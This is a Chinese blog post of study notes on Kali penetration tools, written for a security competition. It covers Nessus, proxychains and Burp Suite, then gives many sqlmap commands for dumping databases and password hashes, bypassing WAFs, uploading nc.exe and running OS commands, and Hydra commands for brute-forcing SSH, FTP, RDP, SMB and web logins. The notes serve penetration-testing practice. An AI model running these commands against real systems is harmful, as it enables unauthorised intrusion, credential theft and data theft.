---
title: Kali相关渗透工具学习笔记
time: 2016.05.23 12:47:00
layout: post
tags:
- python
- 工具
- Kali
excerpt:  这个礼拜要参加蓝盾杯的比赛😂然而，蓝盾杯炒鸡坑，只能用官方的虚拟机，而且还不能联网，比赛的时间还炒鸡短！所以，这几天打算熟悉下工具

---

# Nessus

Nessus是一个功能强大而又易于使用的远程安全扫描器，它不仅免费而 且更新极快。安全扫描器的功能是对指定网络进行安全检查，找出该网络是否存在有导致对手攻击的安全漏洞。该系统被设计为client/sever模式，服 务器端负责进行安全检查，客户端用来配置管理服务器端。在服务端还采用了plug-in的体系，允许用户加入执行特定功能的插件，这插件可以进行更快速和 更复杂的安全检查。在Nessus中还采用了一个共享的信息接口，称之知识库，其中保存了前面进行检查的结果。检查的结果可以HTML、纯文本、 LaTeX（一种文本文件格式）等几种格式保存。 
# proxychain

proxychain是一款功能强大的网络代理工具，允许TCP和DNS通过代理隧道，支持HTTP、SOCK4、SOCK5类型的代理服务器，并且可以配置多个代理。具体请查看网络。

# TrueCrypt
该工具为一款目录加密工具，这个应该也用不到 － －

# Burp Suite
## 简介
Burp Suite 是用于攻击web 应用程序的集成平台。它包含了许多工具，并为这些工具设计了许多接口，以促进加快攻击应用程序的过程。所有的工具都共享一个能处理并显示HTTP 消息，持久性，认证，代理，日志，警报的一个强大的可扩展的框架。

##工具箱：

（1）Proxy——是一个拦截HTTP/S的代理服务器，作为一个在浏览器和目标应用程序之间的中间人，允许你拦截，查看，修改在两个方向上的原始数据流。

（2）Spider——是一个应用智能感应的网络爬虫，它能完整的枚举应用程序的内容和功能。

（3）Scanner[仅限专业版]——是一个高级的工具，执行后，它能自动地发现web 应用程序的安全漏洞。

（4）Intruder——是一个定制的高度可配置的工具，对web应用程序进行自动化攻击，如：枚举标识符，收集有用的数据，以及使用fuzzing 技术探测常规漏洞。

（5）Repeater——是一个靠手动操作来补发单独的HTTP 请求，并分析应用程序响应的工具。

（6）Sequencer——是一个用来分析那些不可预知的应用程序会话令牌和重要数据项的随机性的工具。

（7）Decoder——是一个进行手动执行或对应用程序数据者智能解码编码的工具。

（8）Comparer——是一个实用的工具，通常是通过一些相关的请求和响应得到两项数据的一个可视化的“差异”。

# sqlmap
备注：(注入的时候最好把设定-v 3 -l 3)

1. 检索当前数据库和当前用户

		sqlmap -u target.com --cookie="1231" -b --current-db -current-user
	
	-b:获取DBMS banner 还有--os用于探测数据库服务器系统 --is-dba 判断当前用户是否为管理 --users 列出所有管理用户 --passwords列出并破解数据库用户的hash --privileges 列出数据库管理员权限
2. 挖取数据库 --dbs（－D） 挖取表 --tables（－T） 挖取列 --columns（—C） 挖掘详细内容 --dump
3. 读文件 -r test.txt 这里加载HTTP请求 加载文本为-m
4. 载入过滤插件  --tamper（这个一般用于绕过waf） 这个具体参照：[http://drops.wooyun.org/tools/4760](http://drops.wooyun.org/tools/4760) 加载多个可用逗号隔开即可
		
		python sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/get_int.php?id=1" --tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3
5. 伪静态注入  有些web服务器进行了url rewrite或者网站是伪静态的，无法直接提供测试参数，这样子可以使用*来代替要测试的参数。
6. 请求延迟  在注入过程中请求太频繁的话可能会被防火墙拦截，这时候--delay参数就起作用了。可以设定两次HTTP请求间的延时。有的web程序会在多次错误访问后屏蔽所有请求，这样就导致之后所有的测试无法进行，绕过这个策略可以使用--safe-url，每隔一段时间去访问一个正常的页面。
7. post注入  有两种方法来进行post注入，一种是使用--data参数，将post的key和value用类似GET方式来提交。二是使用-r参数，sqlmap读取用户抓到的POST请求包，来进行POST注入检测。
	
		python sqlmap.py -u "http://www.target.com/vuln.php" --data="id=1" -f --banner --dbs --users
8. 拆分字符  --param-del

		python sqlmap.py -u "http://www.target.com/vuln.php" --data="query=foobar;id=1" --param-del=";" -f --banner --dbs --users

9. 避免过多的错误请求被屏蔽
	1. --safe-url：提供一个安全不错误的连接，每隔一段时间都会去访问一下。
	2. --safe-freq：提供一个安全不错误的连接，每次测试请求之后都会再访问一边安全连接。

10. 有时候需要在一些环境的前面或者后面加一些字符，保证payload正常运行，就需要参数--prefix,--suffix
	例如，代码中是这样调用数据库的：
		
		$query = "SELECT * FROM users WHERE id=(’" . $_GET[’id’] . "’) LIMIT 0, 1"; 
	这时你就需要--prefix和--suffix参数了：
		python sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1" -p id --prefix "’)" --suffix "AND (’abc’=’abc"
	这样执行的SQL语句变成：
	
		$query = "SELECT * FROM users WHERE id=(’1’) <PAYLOAD> AND (’abc’=’abc’) LIMIT 0, 1"; 
11. 有时候--tables 无法获取到数据库表时，可用使用--common-tables爆破表名 同理 --common-columns 你懂的
12. 如果当前用户有权读取文件，可用使用--file-read
	
		
		python sqlmap.py -u "http://192.168.136.129/sqlmap/mssql/iis/get_str2.asp?name=luther" \--file-read "C:/example.exe" -v 1

同理 文件上传到服务器操作 --file-write,--file-dest

	python sqlmap.py -u "http://192.168.136.129/sqlmap/mysql/get_int.aspx?id=1" --file-write \"/software/nc.exe.packed" --file-dest "C:/WINDOWS/Temp/nc.exe" -v 1

13. 运行操作系统命令 --os-cmd,--os-shell
	
	
		python sqlmap.py -u "http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1" \--os-cmd id -v 1	

# Hydra学习
1. 破解ssh：

	
		hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip ssh
		hydra -l 用户名 -p 密码字典 -t 线程 -o save.log -vV ip ssh
2. 破解ftp：

		hydra ip ftp -l 用户名 -P 密码字典 -t 线程(默认16) -vV
		hydra ip ftp -l 用户名 -P 密码字典 -e ns -vV
3. get方式提交，破解web登录：

		hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip http-get /admin/
		hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns -f ip http-get /admin/index.php
4. post方式提交，破解web登录：

		hydra -l 用户名 -P 密码字典 -s 80 ip http-post-form “/admin/	login.php:username=^USER^&amp;password=^PASS^&amp;submit=login:sorry password”

		hydra -t 3 -l admin -P pass.txt -o out.txt -f 10.36.16.18 http-post-form “login.php:id=^USER^&amp;passwd=^PASS^:wrong username or password”

	（参数说明：-t同时线程数3，-l用户名是admin，字典pass.txt，保存为out.txt，-f 当破解了一个密码就停止， 10.36.16.18目标ip，http-post-form表示破解是采用http的post方式提交的表单密码破解,内容是表示错误猜解的返回信息提示。

5.	破解https：

		hydra -m /index.php -l muts -P pass.txt 10.36.16.18 https

6.	破解teamspeak：

		hydra -l 用户名 -P 密码字典 -s 端口号 -vV ip teamspeak

7. 破解cisco：
	
		hydra -P pass.txt 10.36.16.18 cisco
	
		hydra -m cloud -P pass.txt 10.36.16.18 cisco-enable

8. 破解smb：

		hydra -l administrator -P pass.txt 10.36.16.18 smb

9. 破解pop3：

		hydra -l muts -P pass.txt my.pop3.mail pop3

10. 破解rdp：

		hydra ip rdp -l administrator -P pass.txt -V

11. 破解http-proxy：

		hydra -l admin -P pass.txt http-proxy://10.36.16.18

12. 破解imap：

		hydra -L user.txt -p secret 10.36.16.18 imap PLAIN

		hydra -C defaults.txt -6 imap://[fe80::2c:31ff:fe12:ac11]:143/PLAIN

----

